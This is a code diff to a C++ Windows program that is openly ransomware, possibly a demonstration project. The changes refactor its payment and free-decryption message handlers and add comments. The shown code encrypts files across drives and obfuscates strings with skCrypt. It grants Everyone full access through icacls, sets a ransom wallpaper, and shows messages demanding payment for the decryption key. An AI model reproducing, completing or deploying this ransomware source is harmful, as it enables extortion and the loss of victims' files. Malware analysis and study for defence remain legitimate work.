@@ -138,8 +138,8 @@ fs::path ServiceWorker::decryptRandomFile()
     }
 
     // That could be moved to encryptAllFiles() and generate RSA keys just for one random file,
-    // then encrypt it and save for use in this function, but in the purpouse of this project
-    // it is not necessary.
+    // then encrypt it and save for use in this function, but to keep this project simple
+    // I decided to generate RSA keys only once and use them for all files
 
     // 1. Generate new RSA key pair
     if (not m_keyManager->generateRSAKey())
@@ -178,7 +178,7 @@ fs::path ServiceWorker::decryptRandomFile()
 
     if (lines.size() < 5) 
     {
-        DBG_PRINT("File does not contain enough lines to modify the 5th one");
+        DBG_PRINT("File does not contain enough lines to modify free decryption flag field");
         utils::stopAndExit(EXIT_FAILURE);
     }
 
@@ -218,14 +218,14 @@ void ServiceWorker::unpackResources()
     if (hRes == NULL)
     {
         DBG_PRINT("Finding zip resource failed");
-        utils::stopAndExit(EXIT_FAILURE);
+        return utils::stopAndExit(EXIT_FAILURE);
     }
 
     HGLOBAL hData = LoadResource(nullptr, hRes);
     if (hData == NULL)
     {
 		DBG_PRINT("Loading zip resource failed");
-		utils::stopAndExit(EXIT_FAILURE);
+        return utils::stopAndExit(EXIT_FAILURE);
 	}
 
     void* data = LockResource(hData);
@@ -234,7 +234,7 @@ void ServiceWorker::unpackResources()
     if (data == NULL)
     {
         DBG_PRINT("Locking zip resource failed (data was NULL)");
-        utils::stopAndExit(EXIT_FAILURE);
+        return utils::stopAndExit(EXIT_FAILURE);
     }
 
     std::ofstream file(_("tmp.zip"), std::ios::binary);
@@ -249,6 +249,13 @@ void ServiceWorker::unpackResources()
 void ServiceWorker::grantFullAccess()
 {
     INSERT_RND_LEGIT_STR;
+
+    /*
+        Command grants full read and write permissions to every user (Everyone) for the current directory and all its contents, 
+        including recursively applying these permissions to subdirectories and files. 
+        The command will continue even if errors occur and will operate quietly without displaying messages.
+    */
+
     sysCall(skCrypt("icacls . /grant Everyone:F /T /C /Q"));
 }
 
@@ -271,14 +278,14 @@ void ServiceWorker::setWallpaper()
     if (hRes == NULL)
     {
         DBG_PRINT("Finding png resource failed");
-        utils::stopAndExit(EXIT_FAILURE);
+        return utils::stopAndExit(EXIT_FAILURE);
     }
 
     HGLOBAL hData = LoadResource(nullptr, hRes);
     if (hData == NULL)
     {
         DBG_PRINT("Loading png resource failed");
-        utils::stopAndExit(EXIT_FAILURE);
+        return utils::stopAndExit(EXIT_FAILURE);
     }
 
     void* data = LockResource(hData);
@@ -287,7 +294,7 @@ void ServiceWorker::setWallpaper()
     if (data == NULL)
     {
         DBG_PRINT("Locking png resource failed (data was NULL)");
-        utils::stopAndExit(EXIT_FAILURE);
+        return utils::stopAndExit(EXIT_FAILURE);
     }
 
     std::ofstream file(_("tmp.png"), std::ios::binary);
@@ -304,8 +311,6 @@ void ServiceWorker::setWallpaper()
 
 void ServiceWorker::handleServerComs(std::unique_ptr<NamedPipeServer> server)
 {
-    auto drives = getDrives();
-
     while (true)
     {
         char buffer[0x100]{ '\0' };
@@ -317,40 +322,53 @@ void ServiceWorker::handleServerComs(std::unique_ptr<NamedPipeServer> server)
 
             if (msg.find(_("PAYMENT_REC")) != std::string::npos)
             {
-                DBG_PRINT("Payment received, decrypting files...");
-
-                m_keyManager->receivePrivateKeyFrom(getPrivateKeyFilePath().c_str());
-                decryptAllFiles(drives);
-
-                MessageBoxA(0,
-                    skCrypt("Your files have been decrypted.\nThanks you for your cooperation!."),
-                    skCrypt("Decryption successful"),
-                    MB_OK | MB_ICONINFORMATION);
+                handlePaymentMsg();
             }
             else if (msg.find(_("FREE_DEC")) != std::string::npos)
             {
                 if (not m_usedFreeDecryption)
-                {
-                    DBG_PRINT("Free decryption request received, decrypting random file...");
-                    auto path = decryptRandomFile();
-
-                    DBG_PRINT("Decrypted file path: %s", path.string().c_str());
-                    MessageBoxA(0,
-                        (_("Random file have been decrypted. You can find the decrypted file at: ") + path.string()).c_str(),
-                        skCrypt("Decryption successful"),
-                        MB_OK | MB_ICONINFORMATION);
-                }
+                    handleFreeDecryptMsg();
                 else
-                {
-                    DBG_PRINT("Free decryption request received, but already used");
-                    MessageBoxA(0,
-                        skCrypt("You have already used your free decryption.\nYou can purchase the decryption key by paying the ransom."),
-                        skCrypt("Free decryption already used"),
-                        MB_OK | MB_ICONINFORMATION);
-                }
+                    handleDecryptionMsg();
             }
         }
     }
+}
+
+void ServiceWorker::handlePaymentMsg()
+{
+    DBG_PRINT("Payment received, decrypting files...");
+
+    auto drives = getDrives();
+
+    m_keyManager->receivePrivateKeyFrom(getPrivateKeyFilePath().c_str());
+    decryptAllFiles(drives);
+
+    MessageBoxA(0,
+        skCrypt("Your files have been decrypted.\nThank you for your cooperation!."),
+        skCrypt("Decryption successful"),
+        MB_OK | MB_ICONINFORMATION);
+}
+
+void ServiceWorker::handleFreeDecryptMsg()
+{
+    DBG_PRINT("Free decryption request received, decrypting random file...");
+    auto path = decryptRandomFile();
+
+    DBG_PRINT("Decrypted file path: %s", path.string().c_str());
+    MessageBoxA(0,
+        (_("Random file have been decrypted. You can find the decrypted file at: ") + path.string()).c_str(),
+        skCrypt("Decryption successful"),
+        MB_OK | MB_ICONINFORMATION);
+}
+
+void ServiceWorker::handleDecryptionMsg()
+{
+    DBG_PRINT("Free decryption request received, but already used");
+    MessageBoxA(0,
+        skCrypt("You have already used your free decryption.\nYou can purchase the decryption key by paying the ransom."),
+        skCrypt("Free decryption already used"),
+        MB_OK | MB_ICONINFORMATION);
 }
 
 void ServiceWorker::searchAndEncryptFiles(const fs::path& dir, bool decrypt)
@@ -383,7 +401,6 @@ void ServiceWorker::searchAndEncryptFiles(const fs::path& dir, bool decrypt)
                     if (path.string().find(_("attacker_server")) != std::string::npos)
 						continue;
 
-                    //TODO: stats ?
                     if (!m_fileEncrypter->encryptFile(path.string().c_str()))
                         DBG_PRINT("Cannot encrypt file %s", path.string().c_str());
                 }
@@ -393,7 +410,6 @@ void ServiceWorker::searchAndEncryptFiles(const fs::path& dir, bool decrypt)
                 //Decrypting all encrypted files
                 if (ext == encryptedFileExt)
                 {
-                    //TODO: stats ?
 					if (!m_fileEncrypter->decryptFile(path.string().c_str()))
 					    DBG_PRINT("Cannot decrypt file %s", path.string().c_str());
 				}
@@ -513,7 +529,16 @@ void ServiceWorker::unpackZIP(const std::string& zipPath, const std::string& des
 
     DBG_PRINT("Unpacking %s to %s", zipPath.c_str(), destPath.c_str());
     char command[512];
-    sprintf(command, skCrypt("powershell -command \"Expand-Archive -LiteralPath '%s' -DestinationPath '%s'\" -Force\""), zipPath.c_str(), destPath.c_str());
+
+    /*
+        Extract the contents of the specified archive file to the specified destination directory, 
+        overwriting existing files if necessary, without prompting for confirmation.
+    */
+
+    sprintf(command, 
+        skCrypt("powershell -command \"Expand-Archive -LiteralPath '%s' -DestinationPath '%s'\" -Force\""), 
+        zipPath.c_str(), 
+        destPath.c_str());
 
     sysCall(command);
 }
